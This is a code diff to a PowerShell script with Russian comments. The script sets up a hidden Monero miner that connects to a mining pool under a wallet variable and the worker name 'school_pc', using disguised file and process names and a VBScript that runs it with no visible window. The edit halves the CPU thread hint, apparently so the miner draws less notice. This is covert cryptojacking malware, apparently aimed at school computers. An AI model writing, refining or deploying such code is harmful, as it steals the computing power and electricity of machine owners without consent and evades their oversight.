@@ -24,7 +24,7 @@ try {
 
 # 5. Создание файлов запуска (Батник с новыми параметрами)
 # Здесь мы добавили --algo rx/0 и --donate-level 1 для стабильности
-$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 100 --no-huge-pages --algo rx/0 --donate-level 1 --priority 4"
+$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --no-huge-pages --algo rx/0 --donate-level 1 --priority 4"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
